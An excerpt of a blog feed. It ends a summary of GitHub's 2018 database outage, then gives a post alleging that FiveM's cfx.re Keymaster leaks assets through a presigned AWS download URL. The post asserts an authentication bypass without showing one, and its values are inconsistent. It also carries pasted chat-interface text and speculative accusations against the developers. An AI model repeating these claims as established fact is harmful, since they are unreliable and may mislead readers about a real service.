<p>GitHub has many services and features, and to maintain separation of concerns, this requires many database clusters, each having its designated primary. All primaries were in the East Coast data center, with replicas spread across both coasts. Specific replicas in the West functioned as intermediate primaries, or in other words. A replica can have replicas that can have more replicas. This may seem overcomplicated, but there are a few advantages here. In terms of cost, a single replication layer means a lot of cross-data center traffic which is very expensive. With an intermediate primary, the cross-data center hop is only performed once. They also reduce the load on the primary as it only replicates to its descendants.</p>
<h2>The Role of Orchestrator</h2>
<p>GitHub has a homegrown tool to manage all of this called <a href="https://github.blog/2016-12-08-orchestrator-github/" target="_blank" rel="noopener noreferrer">Orchestrator</a>, which comes with a UI to help visualize and manage database topologies. Most importantly, though, it supports automatic primary failover; the primary orchestrator in a database system will automatically failover and promote a new primary within 30 seconds if it detects that replicas cannot contact the primary. However, if the orchestrator is not configured carefully, it can implement topologies the application does not support.</p>
<h2>The Incident and Its Aftermath</h2>
<p>In the specific incident, replication lag caused data to be present in the East Coast clusters but not in the West Coast and writes timed out and failed for a few seconds. Orchestrator nodes in the West Coast and US East cloud established quorum to fail over since the primaries were unreachable to both orchestrator and replicas. Replicas in the US West database were promoted as the new primaries, and write traffic was restored. The East and West Coast databases contained unique writes not present in the other, causing inconsistencies after restoring the connection.</p>
<p>The engineers at GitHub were facing issues with the cross-country latency of their database services, making the website unusable for many users. They were stuck between a rock and a hard place, as reversing the situation would require removing the West Coast from service, which would cause data loss for many users. Some engineers believed failing back was the correct option, but others disagreed, stating that data integrity was paramount.</p>
<h2>The Recovery Process</h2>
<p>Eventually, GitHub prioritized data integrity over the speed of recovery and site usability, turning off certain features to prevent further database impact and drafting a plan. The plan was to fail forward and continue with U.S West as the primary until the East Coast clusters were fully synchronized. The East Coast required a restore from backup, and the engineers saved the unreplicated writes to reconcile later.</p>
<p>The recovery process took longer than expected, and the estimated time for recovery was off due to a miscalculation. The outage also caused a backlog of webhooks and page builds to process, which took some time to clear. Despite trying to avoid such situations, things sometimes don't work out as expected. GitHub experienced a seven-hour outage due to a maintenance mishap but restored normal operations and updated the site status to green.</p>
<h2>Lessons Learned and Future Initiatives</h2>
<p>The incident led to a rethinking of the capabilities of the orchestrator and the establishment of a crisper and more transparent reporting mechanism. The long-term goal is to allow the application to tolerate a complete failure of a single data center without impact.</p>
<p>GitHub's architecture is more mature than many of its competitors, but with grand scale comes excellent complexity. The incident served as a stark reminder of the challenges of managing large-scale, distributed systems. It also highlighted the importance of robust disaster recovery plans and the need for systems to be designed to handle unexpected failures gracefully.</p>
<p>In conclusion, the incident at GitHub was a significant event in software development and database management. It was a valuable lesson for other organizations about the importance of robust, resilient systems and the potential pitfalls of managing large-scale, distributed databases. It also underscored the importance of prioritizing data integrity over the speed of recovery, even in the face of significant service degradation.</p>
<h2>Sources</h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=dsHyUgGMht0" target="_new">How GitHub's Database Self-Destructed in 43 Seconds - YouTube</a><br><a href="https://github.blog/2018-10-30-oct21-post-incident-analysis/" target="_new"></a></li>
<li><a href="https://github.blog/2018-10-30-oct21-post-incident-analysis/" target="_new">October 21 Post Incident Analysis - GitHub Blog</a><br><a href="https://github.blog/2016-12-08-orchestrator-github/" target="_new"></a></li>
<li><a href="https://github.blog/2016-12-08-orchestrator-github/" target="_new">Orchestrator at GitHub - GitHub Blog</a><br><a href="https://github.blog/2018-06-20-mysql-high-availability-at-github/" target="_new"></a></li>
<li><a href="https://github.blog/2018-06-20-mysql-high-availability-at-github/" target="_new">MySQL High Availability at GitHub - GitHub Blog</a><br><a href="https://news.ycombinator.com/item?id=18272928" target="_new"></a></li>
<li><a href="https://news.ycombinator.com/item?id=18272928" target="_new">Discussion on Hacker News</a><br><a href="https://www.reddit.com/r/programming/comments/9q94am/github_major_service_outage/" target="_new"></a></li>
<li><a href="https://www.reddit.com/r/programming/comments/9q94am/github_major_service_outage/" target="_new">Discussion on Reddit</a><br><a href="https://hub.packtpub.com/github-down-for-over-7-hours-due-to-failure-in-its-data-storage-system/" target="_new"></a></li>
<li><a href="https://hub.packtpub.com/github-down-for-over-7-hours-due-to-failure-in-its-data-storage-system/" target="_new">GitHub Down for Over 7 Hours Due to Failure in Its Data Storage System - Packt </a><a href="https://hub.packtpub.com/github-down-for-over-7-hours-due-to-failure-in-its-data-storage-system/" target="_new">Hub</a><br><a href="https://github.blog/2017-10-12-evolution-of-our-data-centers/" target="_new"></a></li>
<li><a href="https://github.blog/2017-10-12-evolution-of-our-data-centers/" target="_new">Evolution of Our Data Centers - GitHub Blog</a><br><a href="https://www.githubstatus.com/history?page=19" target="_new"></a></li>
<li><a href="https://www.githubstatus.com/history?page=19" target="_new">GitHub Status History</a></li>
</ul>
            ]]>
        </content>
    </entry>
    <entry>
        <title>FiveM&#x27;s Granted Assets Security Backdoor </title>
        <author>
            <name>thefourCraft</name>
        </author>
        <link href="https://blog.thefourcraft.com/fivems-granted-assets-security-backdoor/index.html"/>
        <id>https://blog.thefourcraft.com/fivems-granted-assets-security-backdoor/index.html</id>
        <media:content url="https://blog.thefourcraft.com/media/posts/44/FiveMs-Granted-Assets-Security-Backdoor.png" medium="image" />
            <category term="Security"/>
            <category term="FiveM"/>
            <category term="Cloud Security"/>
            <category term="AWS"/>

        <updated>2023-05-14T02:34:51+03:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://blog.thefourcraft.com/media/posts/44/FiveMs-Granted-Assets-Security-Backdoor.png" alt="" />
                    I have discovered a vulnerability within FiveM's content.cfx.re/assets system that allows unauthorized individuals to download content without needing authentication or&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://blog.thefourcraft.com/media/posts/44/FiveMs-Granted-Assets-Security-Backdoor.png" class="type:primaryImage" alt="" /></p>
                <p>I have discovered a vulnerability within FiveM's content.cfx.re/assets system that allows unauthorized individuals to download content without needing authentication or being connected to cfx.re. This security flaw raises significant concerns about the platform's integrity and user data protection. I have made multiple attempts to communicate this issue to the FiveM team, but unfortunately, my efforts were ignored, leading me to disclose this vulnerability publicly.</p>
<p class="msg msg--warning">I hesitated to publish this blog post, as I encountered difficulties communicating with the FiveM or cfx.re team, who unfortunately chose to ignore me and blacklist me from their GitHub. Despite my persistent effort to establish contact, I have made my report and findings public.</p>
<h2>What is FiveM?</h2>
<p>FiveM is a modification framework for the famous Grand Theft Auto V (GTA V), developed by Rockstar Games. FiveM allows users to create and customize their own multiplayer experiences within the game, separate from the official GTA Online multiplayer mode.</p>
<p>With FiveM, players can create their dedicated servers and modify various aspects of the game, including adding new maps, vehicles, scripts, and game modes. It provides a platform for developers to build and share their custom multiplayer game modes, role-playing servers, and other creative content.</p>
<p>FiveM is widely used for role-playing servers. These role-playing servers often have rules and communities, offering a unique multiplayer experience. Players take on different roles and engage in activities such as police enforcement, emergency services, criminal enterprises, or simply interacting with other players in a virtual world.</p>
<p>It's worth noting that FiveM is a third-party modification and operates separately from the official GTA Online servers. It is not endorsed or supported by Rockstar Games. Still, it has gained significant popularity among the GTA V community due to its versatility and ability to create customized multiplayer environments.</p>
<h2>About the FiveM Asset Escrow Protection System</h2>
<p>The FiveM Asset Escrow Protection System, developed in collaboration with <a href="https://Tebex.com" target="_blank" rel="noopener noreferrer">Tebex</a>, offers a secure solution for resource authors within the FiveM community. Instead of relying on obfuscation or IP locking, this system encrypts resources and ensures purchase ownership. Authors can protect their code from leaks and unauthorized usage by uploading their zipped resources to the Keymaster 4.0k dashboard. <br>Tebex is the exclusive monetization partner, allowing creators to link their FiveM Assets directly to Tebex packages.<br>Customers who purchase content receive a download link and access management is handled through the keymaster dashboard. <br>This system provides an alternative that avoids performance slowdowns and security concerns associated with traditional protection methods. It encourages collaboration and open-source practices while offering resource developers control over their code and assets.</p>
<h2>So where is the security issue</h2>
<p>The security issue arises when downloading files from the Cfx.re Keymaster. Upon downloading a file, you can inspect its properties to find the "Where from" information, which reveals the original URL of the downloaded file. In the case of the Cfx.re Keymaster, the URL structure is similar to the following example:</p>
<pre><a href="https://content.cfx.re/assets/:asset-id/61e009eea9ffc702734527f676bf26e7?response-content-disposition=attachment%3B%20filename%20%3D%22andrada.zip%22&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=asset-storage%2F20230513%2Fcfx%2Fs3%2Faws4_request&amp;X-Amz-Date=20230513T150508Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Signature=a50608224a501bee0e39447ad5bbbc97b1948c27fbe7ef23f476bbdb1fa20295" target="_new">content.cfx.re/assets/:asset-id/61e009eea9ffc702734527f676bf26e7?response-content-disposition=attachment%3B%20filename%20%3D%22andrada.zip%22&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=asset-storage%2F2023%2Fcfx%2Fs3%2Faws4_request&amp;X-Amz-Date=20230513T150508Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Signature=a50608224a501bee0e39447ad5bbbc97b1948c27fbe7ef23f476bbdb1fa</a></pre>
<p>This URL contains sensitive information, such as the asset ID, file name, and various parameters related to the Amazon Web Services (AWS) authentication and access control. The security concern lies in the fact that this URL structure can be easily deduced, allowing unauthorized individuals to access and download content without proper authentication or being connected to cfx.re.</p>
<h3>Here's a breakdown of the URL</h3>
<ol>
<li>
<p>Base URL: <code>https://content.cfx.re/assets/</code></p>
<ul>
<li>This is the base URL for accessing assets on the Cfx.re Keymaster.</li>
</ul>
</li>
<li>
<p>Asset ID: <code>:asset-id</code></p>
<ul>
<li>This part should be replaced with the actual asset ID. It uniquely identifies the specific asset being accessed.</li>
</ul>
</li>
<li>
<p><strong>Query Parameters:</strong></p>
<ul>
<li><code>response-content-disposition=attachment%3B%20filename%20%3D%22andrada.zip%22</code>: Specifies the content disposition of the response, indicating that it should be treated as an attachment with the filename "andrada.zip".</li>
<li><code>X-Amz-Content-Sha256=UNSIGNED-PAYLOAD</code>: Used in AWS for the content's SHA-256 hash. In this case, it indicates that the payload is not signed.</li>
<li><code>X-Amz-Algorithm=AWS4-HMAC-SHA256</code>: Specifies the hashing algorithm used for authentication.</li>
<li><code>X-Amz-Credential=asset-storage%2F20234%2Fcfx%2Fs3%2Faws4_request</code>: Provides the AWS credentials for authentication, indicating the asset storage, date, service, and request type.</li>
<li><code>X-Amz-Date=20230513T150508Z</code>: Specifies the date and time of the request in UTC format.</li>
<li><code>X-Amz-SignedHeaders=host</code>: Indicates the headers signed as part of the authentication process.</li>
<li><code>X-Amz-Expires=600</code>: Specifies the expiration time for the URL in seconds. In this case, it is set to 600 seconds (10 minutes).</li>
<li><code>X-Amz-Signature=a50608224a501bee0e39447ad5bbbc97b1948c27fbe7ef23f476bbdb1fa23295</code>: The signature generated using the AWS secret key to authenticate the request.</li>
</ul>
</li>
</ol>
<p><br>This URL structure contains the necessary information for accessing and downloading a specific asset from the Cfx.re Keymaster while including authentication and access control parameters based on AWS authentication mechanisms.</p>
<h2>What is the issue here?</h2>
<p>The URL structure you provided exposes a critical security vulnerability within the Cfx.re Keymaster system. This vulnerability enables unauthorized individuals to bypass authentication and access and download content without proper authorization or being connected to cfx.re.<br><br>By deciphering the URL structure, individuals can obtain the asset ID and manipulate the URL to access and download various files hosted on the Keymaster platform. This presents a significant security risk as it allows unauthorized users to obtain sensitive files and data without going through the necessary authentication mechanisms.<br><br>The potential implications of this security flaw are far-reaching. It opens the door for unauthorized access to confidential information, intellectual property, personal data, or other content stored within the Cfx.re Keymaster. This could result in data breaches, unauthorized distribution of proprietary assets, or exposure of sensitive information to malicious actors.<br><br>Users rely on the secure handling and protection of their content when utilizing services like the Cfx.re Keymaster. However, this vulnerability exposes a weakness in the platform's security infrastructure, potentially compromising the confidentiality and integrity of the hosted content. Furthermore, this vulnerability undermines the platform's integrity and erodes user trust.<br><br>Given the critical nature of this vulnerability, <strong>it is essential for the FiveM or cfx.re team to address this issue promptly.</strong> <br>They should prioritize investigating and resolving security flaws to prevent further unauthorized access and potential data breaches. Timely mitigation of this vulnerability will help safeguard user data, protect intellectual property, and maintain the trust of the user community.</p>
<h3>How can this massive security failure occur?</h3>
<p class="msg msg--warning">This section has a personal option</p>
<p>The recent discovery of a significant security failure within the Cfx.re Keymaster has raised concerns about the integrity and protection of user data. The question arises: how could such a massive security failure occur in the first place? Examining this vulnerability's circumstances sheds light on the potential factors contributing to its existence.</p>
<ol>
<li>
<p><strong>Lack of Vulnerability Assessment:</strong> <br>It is possible that the FiveM or cfx.re team did not conduct comprehensive vulnerability assessments or security audits on their platform. <br>Security weaknesses and flaws can go unnoticed without these crucial assessments, leaving the system vulnerable to exploitation.</p>
</li>
<li>
<p><strong>Inadequate Secure Coding Practices:</strong> <br>Insufficient emphasis on secure coding practices during development may have contributed to this security failure. Failure to follow established security guidelines and best practices can lead to vulnerabilities easily exploited by malicious actors.</p>
</li>
<li>
<p><strong>Limited Testing and Quality Assurance:</strong> <br>Insufficient testing and quality assurance processes can result in undetected security vulnerabilities. If rigorous testing procedures were not in place, it becomes easier for security flaws to slip through the cracks, exposing the system to potential breaches.</p>
</li>
<li>
<p><strong>Inadequate Response to Reported Issues:</strong> <br>The inability or unwillingness of the FiveM or cfx.re team to address reported security concerns is another possible cause. If users or researchers have previously alerted the group to potential vulnerabilities, disregarding or ignoring these reports can perpetuate the existence of the security flaw.</p>
</li>
<li>
<p><strong>The Complexity of System Architecture:<br></strong> The complexity of the Cfx.re Keymaster system may have inadvertently introduced vulnerabilities. As systems become more intricate, the likelihood of overlooking potential security weaknesses increases. Complex interactions between various components may create unexpected entry points for unauthorized access.</p>
</li>
<li>
<p><strong>Insufficient Security Training and Awareness:</strong> <br>Inadequate security training and awareness among developers and system administrators can contribute to security failures. Without a deep understanding of security best practices and the latest threats, it becomes easier to overlook potential vulnerabilities during system development and maintenance.</p>
</li>
</ol>
<p>Organizations must prioritize robust security practices, including regular vulnerability assessments, secure coding guidelines, thorough testing, and prompt issue resolution. Fostering a culture of security awareness and investing in ongoing training can also help prevent such massive security failures in the future.</p>
<div class="group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]">
<div class="flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-xl xl:max-w-3xl md:py-6 lg:px-0 m-auto">
<div class="relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]">
<div class="flex flex-grow flex-col gap-3">
<div class="min-h-[20px] flex flex-col items-start gap-4 whitespace-pre-wrap break-words">
<div class="markdown prose w-full break-words dark:prose-invert dark">
<p>Addressing this security failure requires immediate action from the FiveM or cfx.re team. Conducting a thorough investigation, promptly fixing the vulnerability, and implementing measures to prevent similar issues in the future are essential steps toward restoring trust and safeguarding user data.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<h3>Understanding the Security Concerns Surrounding FiveM</h3>
<p>FiveM, or cfx.re, has faced significant criticism regarding its security measures, prompting questions about its overall level of security. Several factors contribute to the perceived insecurity of the platform, which can be examined to understand the concerns.</p>
<ol>
<li>
<p><strong>Lack of Expertise and Experience:</strong> <br>There are concerns that the team behind FiveM or cfx.re may consist of individuals with limited knowledge and experience in the security domain. Insufficient expertise in security practices and protocols can contribute to vulnerabilities and weaken the platform's overall security.</p>
</li>
<li>
<p><strong>Inadequate Attention to Security Standards:</strong> <br>It is suggested that FiveM or cfx.re might not prioritize updating and adhering to industry security standards. Neglecting to implement the latest security practices and failing to meet recognized security standards can leave the platform susceptible to various security issues.</p>
</li>
<li>
<p><strong>Limited Resources for Security Measures:</strong> <br>The lack of dedicated resources, both human and financial, allocated explicitly for implementing robust security measures can be a contributing factor. Insufficient investment in security infrastructure, tools, and personnel can hinder the platform's ability to address security concerns effectively.</p>
</li>
<li>
<p><strong>Potential Communication Gaps:</strong> <br>There might be communication gaps or inadequate channels for reporting security vulnerabilities to the FiveM or cfx.re team. <br>Failure to establish efficient lines of communication can result in unaddressed security flaws and hinder the timely resolution of reported issues.</p>
</li>
<li>
<p><strong>Challenges in Balancing Security and Functionality:</strong> <br>The developers of FiveM may face challenges in striking the right balance between security and providing a feature-rich experience for users. <br>Striving to offer extensive functionality while maintaining a secure environment can be complex, potentially leading to vulnerabilities if not executed effectively.</p>
</li>
</ol>
<p>To enhance the security of FiveM, the development team must invest in security expertise, actively update and adhere to security standards, allocate sufficient resources for security measures, establish effective communication channels for reporting vulnerabilities, and consistently balance functionality with robust security practices.</p>
<h2>The Most Toxic gaming community on the planet </h2>
<p class="msg msg--warning">This section has a personal option derived from publicly available information about the cfx.re development team and the FiveM gaming community  </p>
<p>The toxicity within the Fivem community is evident in how they treat young developers. Instead of providing support, guidance, and encouragement to budding talent, the cfx.re team seems to have taken a different approach. They have consistently undermined and crushed the spirit of these aspiring developers, making it extremely difficult for them to flourish.</p>
<p>Rather than nurturing a positive environment for creativity and growth, the Fivem community has become a breeding ground for hostility and negativity. Toxic behavior, such as harassment, bullying, doxing, and belittling, has become alarmingly prevalent. <br>It has created an atmosphere where young developers and players are discouraged from sharing their ideas and projects, fearing criticism and ridicule.</p>
<p>Furthermore, the cfx.re team's actions have fueled the fire of toxicity. <br>Instead of addressing the issue and taking steps to curb the toxic behavior within their community, they have perpetuated it. <br>Their indifference and lack of action have allowed toxicity to flourish, pushing away potential contributors and tarnishing the reputation of Fivem as a whole.</p>
<p>The impact of this toxic gaming community extends beyond just the young developers. It affects the entire player base, making the gaming experience unpleasant.<br>Toxicity breeds more toxicity, creating a vicious cycle that deters new players from joining and alienates existing ones. </p>
<h2>To Sum Up </h2>
<p>As a developer and gaming community owner who utilizes the cfx.re platform for server operations, I share your frustration regarding the issues. <br>Building and maintaining servers within a gaming community comes at a significant cost, not only in terms of finances but also in the time and effort invested to ensure the safety of players.</p>
<p>Witnessing the cfx.re development team repeatedly letting down their community is disheartening. The platform's shortcomings and security vulnerabilities can be particularly frustrating for individuals like yourself who have dedicated considerable resources to maintain a secure player environment.</p>
<p>The lack of timely resolutions, ongoing issues, and potential negligence on the part of the cfx.re team can lead to disappointment and annoyance. The trust placed in the platform, and its developers are undermined when community owners witness repeated failures and lapses in security.</p>
<p>As a community owner, prioritizing your players' safety and well-being is crucial.</p>
<p>While the frustrations are valid, staying informed about the platform's updates and security improvements is essential. Voicing concerns and engaging in constructive dialogue with the cfx.re team can also help advocate for necessary changes and improvements within the community.</p>
<p>Ultimately, the commitment to maintaining a safe and enjoyable gaming experience for your players remains paramount. Evaluating available options and taking proactive steps to address security concerns will contribute to your gaming community's long-term success and satisfaction.</p>
<p> </p>
            ]]>
        </content>
    </entry>
</feed>
